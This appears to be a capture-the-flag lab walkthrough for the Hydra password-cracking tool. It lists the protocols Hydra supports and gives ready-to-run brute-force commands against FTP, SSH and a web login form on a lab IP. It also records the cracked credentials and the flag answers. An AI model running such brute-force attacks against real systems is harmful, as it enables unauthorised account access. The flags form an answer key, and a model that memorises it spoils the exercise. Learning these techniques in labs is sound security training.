# Hydra

## Hydra Introduction

Hydra is a brute force online password cracking program.

Hydra can be used to run through a list and bruteforce an authentication service.

```
Hydra has the ability to bruteforce the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.
```

## Using Hydra

The options that we pass into Hydra depend on which service we are attacking.

For FTP - `hydra -l user -P <passlist.txt> ftp://<IP>`

For SSH - `﻿hydra -l <username> -P <full path to pass> 10.10.233.164 -t 4 ssh`

Hydra can also be used to brute for web forms too, provided you know the type of request that is being made. This can all be found in the source code or in the development tools section of your web browser.

**Questions**

    1. Use Hydra to bruteforce molly's web password. What is flag 1?

THM{2673a7dd116de68e85c48ec0b1f2612e}

`hydra -l molly -P /opt/wordlist/rockyou.txt 10.10.233.164 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V`

molly:sunshine

    2. Use Hydra to bruteforce molly's SSH password. What is flag 2?

THM{c8eeb0468febbadea859baeb33b2541b}

`hydra 10.10.233.164 -l molly -P /opt/wordlist/rockyou.txt -t16 ssh -V`

molly:butterfly